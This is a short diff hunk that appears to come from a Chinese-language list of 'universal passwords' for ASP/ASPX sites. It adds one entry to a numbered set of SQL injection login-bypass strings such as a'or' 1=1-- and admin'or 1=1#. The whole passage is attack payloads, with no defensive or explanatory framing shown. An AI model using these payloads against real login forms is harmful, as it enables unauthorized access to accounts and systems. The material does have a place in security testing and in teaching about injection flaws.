@@ -6,6 +6,7 @@ asp aspx万能密码
 5：a'or' 1=1--
 6："or 1=1--
 7：'or.'a.'='a
+8："or"="a'='a
 9：'or''='
 10：'or'='or'
 admin'or 1=1#
